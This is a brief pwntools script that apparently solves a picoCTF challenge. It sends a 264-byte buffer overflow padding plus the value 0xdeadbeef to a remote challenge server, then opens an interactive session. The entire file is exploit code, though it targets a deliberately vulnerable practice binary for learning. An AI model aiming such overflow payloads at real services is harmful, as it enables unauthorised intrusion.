from pwn import *

#r = process('./chall')
r = remote('mars.picoctf.net', 31890)
payload = b'a' * 264
payload += p64(0xdeadbeef)

r.sendline(payload)
r.interactive()
